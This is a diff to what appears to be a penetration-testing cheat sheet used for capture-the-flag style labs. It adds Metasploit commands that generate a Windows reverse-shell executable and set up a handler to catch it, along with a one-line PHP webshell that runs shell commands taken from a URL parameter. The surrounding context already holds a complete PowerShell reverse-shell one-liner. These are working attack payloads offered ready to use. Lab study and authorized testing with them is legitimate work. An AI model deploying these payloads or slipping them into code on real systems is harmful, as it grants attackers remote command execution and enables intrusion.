@@ -96,6 +96,15 @@ tmux new-session -s session_name # Create a new session
 # =========
 syn.scan 192.168.1.0/24 1 10000 # Ports 1-10000
 
+# ==========
+# Metasploit
+# ==========
+msfvenom -p <PAYLOAD> <OPTIONS> # Standard syntax for msfvenom commands
+msfvenom -p windows/x64/shell/reverse_tcp -f exe -o shell.exe LHOST=<listen-IP> LPORT=<listen-port> # Generate a Windows x64 Reverse Shell in a .exe format
+<OS>/<arch>/<payload>, Examples: linux/x86/shell_reverse_tcp, windows/shell_reverse_tcp, shell/reverse_tcp # Staged Payloads are denoted by '/' while stageless are denoted by '_'
+use multi/handler # Multi/Handler is a superb tool for catching reverse shells
+exploit -j # Tells metasploit to exploit as a background job
+
 # ========
 # Gobuster
 # ========
@@ -206,6 +215,16 @@ echo "TmFtZTogVEhNLXVzZX.IKQWRkcmVzczogMTIz.NCBJbnRlcm5ldCwgVE.hNCkNyZWRpdCBDYXJ
 nmap -p 80 --script http-headers $ip # Banner Grabbing
 responder -I ens5 # Responder to create an SMB listener
 powershell -c "$client = New-Object System.Net.Sockets.TCPClient('<ip>',<port>);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"# Powershell RevShell One-Liner
+<?php echo "<pre>" . shell_exec($_GET["cmd"]) . "</pre>"; ?> # Example Simple PHP Webshell
+
+
+
+
+
+
+
+
+
 
 
 
